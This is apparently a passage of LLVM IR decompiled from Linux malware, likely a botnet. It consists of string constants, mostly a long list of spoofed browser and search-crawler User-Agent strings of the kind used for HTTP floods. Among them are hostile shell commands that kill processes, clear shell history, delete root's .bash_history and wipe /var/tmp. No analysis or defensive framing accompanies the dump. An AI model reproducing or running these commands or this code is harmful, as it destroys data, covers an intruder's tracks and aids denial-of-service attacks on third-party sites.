inbounds ([3 x i8], [3 x i8]* @global_var_1d604.431, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1d608.432, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1d60c.433, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1d610.434, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1d614.435, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1d618.436, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1d61c.437, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1d620.438, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1d634.439, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1d640.440, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1d64c.441, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1d654.442, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1d65c.443, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1d668.444, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1d674.445, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1d67c.446, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1d688.447, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1d694.448, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1d6a0.449, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1d5b8.419, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1d5c0.420, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1d6ac.450, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1d6b4.451, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1d6bc.452, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1d6c8.453, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1d6d4.454, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1d6dc.455, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1d6e4.456, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1d6f0.457, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1d6f8.36, i32 0, i32 0), i8* bitcast (i32* @global_var_1d6fc.458 to i8*), i8* bitcast (i32* @global_var_1d700.459 to i8*), i8* bitcast (i32* @global_var_1d704.460 to i8*), i8* bitcast (i32* @global_var_1d708.461 to i8*), i8* bitcast (i32* @global_var_1d70c.462 to i8*), i8* bitcast (i32* @global_var_1d710.463 to i8*), i8* bitcast (i32* @global_var_1d714.464 to i8*), i8* bitcast (i32* @global_var_1d718.465 to i8*), i8* bitcast (i32* @global_var_1d71c.466 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1d720.467, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1d724.468, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1d728.469, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1d72c.470, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1d730.471, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1d734.472, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1d738.473, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1d73c.474, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1d740.475, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1d744.476, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1d748.477, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1d74c.478, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1d754.479, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1d75c.480, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1d764.481, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1d76c.482, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1d774.483, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1d77c.484, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1d784.485, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1d78c.486, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1d794.487, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1d7a0.488, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1d7a8.489, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1d7b0.490, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1d7bc.491, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1d7c4.492, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1d7cc.493, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1d7d4.494, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1d7dc.495, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1d7e4.496, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1d7ec.497, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1d7f4.498, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1d800.499, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1d808.500, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_1d810.501, i32 0, i32 0)]
@global_var_1e8b0.504 = constant [11 x i8] c"pkill -9 \22\00"
@global_var_1e8bc.506 = constant i32 34
@global_var_1e8c0.508 = constant [16 x i8] c"AAAAAAAAnetcore\00"
@global_var_1e8d4.510 = constant [3 x i8] c"AA\00"
@global_var_1e974.512 = constant [22 x i8] c"history -c;history -w\00"
@global_var_1e98c.514 = constant [30 x i8] c"cd /root;rm -rf .bash_history\00"
@global_var_1e9ac.516 = constant [21 x i8] c"cd /var/tmp; rm -f *\00"
@global_var_1e9ec.518 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_1ea2c.519 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_1ea6c.520 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_1eafc.521 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_1eb34.522 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_1eb54.523 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_1eb6c.524 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_1ebc4.525 = constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00"
@global_var_1ec64.526 = constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00"
@global_var_1ecb8.527 = constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00"
@global_var_1ed2c.528 = constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00"
@global_var_1ed6c.529 = constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_1ee24.530 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00"
@global_var_1ee78.531 = constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00"
@global_var_1eed0.532 = constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00"
@global_var_1ef28.533 = constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00"
@global_var_1ef68.534 = constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00"
@global_var_1efb0.535 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00"
@global_var_1f008.536 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00"
@global_var_1f074.537 = constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00"
@global_var_1f0cc.538 = constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00"
@global_var_1f11c.539 = constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00"
@global_var_1f140.540 = constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00"
@global_var_1f19c.541 = constant [15 x i8] c"wii libnup/1.0\00"
@global_var_1f1ac.542 = constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00"
@global_var_1f1dc.543 = constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00"
@global_var_1f200.544 = constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00"
@global_var_1f224.545 = constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00"
@global_var_1f240.546 = constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_1f280.547 = constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00"
@global_var_1f2d0.548 = constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_1f31c.549 = constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00"
@global_var_1f358.550 = constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00"
@global_var_1f3b4.551 = constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00"
@global_var_1f41c.552 = constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00"
@global_var_1f490.553 = constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00"
@global_var_1f508.554 = constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00"
@global_var_1f564.555 = constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00"
@global_var_1f5b8.556 = constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00"
@global_var_1f640.557 = constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_1f694.558 = constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00"
@global_var_1f6fc.559 = constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00"
@global_var_1f758.560 = constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00"
@global_var_1f7a8.561 = constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00"
@global_var_1f7ec.562 = constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00"
@global_var_1f840.563 = constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00"
@global_var_1f88c.564 = constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_1f8d0.565 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00"
@global_var_1f924.566 = constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00"
@global_var_1f990.567 = constant [110 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00"
@global_var_1fa00.568 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00"
@global_var_1fa5c.569 = constant [116 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1\00"
@global_var_1fad0.570 = constant [110 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)\00"
@global_var_1fb40.571 = constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00"
@global_var_1fbd8.572 = constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)\00"
@global_var_1fc24.573 = constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00"
@global_var_1fc8c.574 = constant [58 x i8] c"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)\00"
@global_var_1fcc8.575 = constant [47 x i8] c"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)\00"
@global_var_1fcf8.576 = constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00"
@global_var_1fd38.577 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00"
@global_var_1fd84.578 = constant [83 x i8] c"Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\00"
@global_var_1fdd8.579 = constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00"
@global_var_1fe88.580 = constant [102 x i8] c"Mozilla/5.0 (compatible; BecomeBot/3.0; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)\00"
@global_var_1fef0.581 = constant [102 x i8] c"Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)\00"
@global_var_1ff58.582 = constant [80 x i8] c"Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0; http://www.beslist.nl/\00"
@global_var_1ffa8.583 = constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00"
@global_var_1ffe0.584 = constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00"
@global_var_20010.585 = constant [91 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 DLC (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_2006c.586 = constant [105 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_200d8.587 = constant [102 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_20140.588 = constant [87 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_20198.589 = constant [90 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_201f4.590 = constant [90 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_20250.591 = constant [86 x i8] c"Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )\00"
@global_var_202a8.592 = constant [93 x i8] c"Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)\00"
@global_var_20308.593 = constant [97 x i8] c"Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)\00"
@global_var_2036c.594 = constant [43 x i8] c"Mozilla/2.0 (compatible; Ask Jeeves/Teoma)\00"
@global_var_20398.595 = constant [52 x i8] c"TerrawizBot/1.0 (+http://www.terrawiz.com/bot.html)\00"
@global_var_203cc.596 = constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00"
@global_var_203ec.597 = constant [31 x i8] c"TheSuBot/0.1 (www.thesubot.de)\00"
@global_var_2040c.598 = constant [85 x i8] c"FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00"
@global_var_20464.599 = constant [94 x i8] c"FAST-WebCrawler/3.7/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)\00"
@global_var_204c4.600 = constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00"
@global_var_2051c.601 = constant [94 x i8] c"FAST-WebCrawler/3.6/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)\00"
@global_var_2057c.602 = constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00"
@global_var_205d4.603 = constant [31 x i8] c"FAST-WebCrawler/3.x Multimedia\00"
@global_var_205f4.604 = constant [37 x i8] c"Mozilla/4.0 (compatible: FDSE robot)\00"
@global_var_2061c.605 = constant [63 x i8] c"findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_2065c.606 = constant [69 x i8] c"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_206a4.607 = constant [69 x i8] c"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_206ec.608 = constant [69 x i8] c"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_20734.609 = constant [69 x i8] c"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_2077c.610 = constant [81 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable\00"
@global_var_207d0.611 = constant [78 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable\00"
@global_var_20820.612 = constant [105 x i8] c"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)\00"
@global_var_2088c.613 = constant [81 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2\00"
@global_var_208e0.614 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2\00"
@global_var_2093c.615 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2\00"
@global_var_20998.616 = constant [97 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)\00"
@global_var_209fc.617 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3\00"
@global_var_20a58.618 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_20ab4.619 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_20b10.620 = constant [96 x i8] c"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_20b70.621 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)\00"
@global_var_20bb8.622 = constant [150 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)\00"
@global_var_20c50.623 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)\00"
@global_var_20c9c.624 = constant [73 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_20ce8.625 = constant [78 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)\00"
@global_var_20d38.626 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)\00"
@global_var_20d80.627 = constant [84 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)\00"
@global_var_20dd4.628 = constant [79 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)\00"
@global_var_20e24.629 = constant [70 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)\00"
@global_var_20e6c.630 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)\00"
@global_var_20eb8.631 = constant [73 x i8] c"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_20f04.632 = constant [71 x i8] c"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)\00"
@global_var_20f4c.633 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_20f9c.634 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_20fec.635 = constant [51 x i8] c"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_21020.636 = constant [51 x i8] c"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_21054.637 = constant [72 x i8] c"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)\00"
@global_var_2109c.638 = constant [54 x i8] c"MojeekBot/0.2 (archi; http://www.mojeek.com/bot.html)\00"
@global_var_210d4.639 = constant [77 x i8] c"Moreoverbot/5.1 ( http://w.moreover.com; webmaster@moreover.com) Mozilla/5.0\00"
@global_var_21124.640 = constant [68 x i8] c"Moreoverbot/5.00 (+http://www.moreover.com; webmaster@moreover.com)\00"
@global_var_21168.641 = constant [47 x i8] c"msnbot/1.0 (+http://search.msn.com/msnbot.htm)\00"
@global_var_21198.642 = constant [47 x i8] c"msnbot/0.9 (+http://search.msn.com/msnbot.htm)\00"
@global_var_211c8.643 = constant [48 x i8] c"msnbot/0.11 ( http://search.msn.com/msnbot.htm)\00"
@global_var_211f8.644 = constant [46 x i8] c"MSNBOT/0.1 (http://search.msn.com/msnbot.htm)\00"
@global_var_21228.645 = constant [71 x i8] c"Mozilla/5.0 (compatible; mxbot/1.0; +http://www.chainn.com/mxbot.html)\00"
@global_var_21270.646 = constant [70 x i8] c"Mozilla/5.0 (compatible; mxbot/1.0; http://www.chainn.com/mxbot.html)\00"
@global_var_212b8.647 = constant [55 x i8] c"NetResearchServer/4.0(loopimprovements.com/robot.html)\00"
@global_var_212f0.648 = constant [55 x i8] c"NetResearchServer/3.5(loopimprovements.com/robot.html)\00"
@global_var_21328.649 = constant [55 x i8] c"NetResearchServer/2.8(loopimprovements.com/robot.html)\00"
@global_var_21360.650 = constant [55 x i8] c"NetResearchServer/2.7(loopimprovements.com/robot.html)\00"
@global_var_21398.651 = constant [55 x i8] c"NetResearchServer/2.5(loopimprovements.com/robot.html)\00"
@global_var_213d0.652 = constant [83 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)\00"
@global_var_21424.653 = constant [55 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)\00"
@global_var_2145c.654 = constant [84 x i8] c"Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)\00"
@global_var_214b0.655 = constant [113 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)\00"
@global_var_21524.656 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)\00"
@global_var_2156c.657 = constant [117 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET \00"
@global_var_215e4.658 = constant [50 x i8] c"Googlebot/2.1 (http://www.googlebot.com/bot.html)\00"
@global_var_21618.659 = constant [35 x i8] c"Opera/9.20 (Windows NT 6.0; U; en)\00"
@global_var_2163c.660 = constant [133 x i8] c"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)\00"
@global_var_216c4.661 = constant [109 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)\00"
@global_var_21734.662 = constant [120 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)\00"
@global_var_217ac.663 = constant [50 x i8] c"Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0\00"
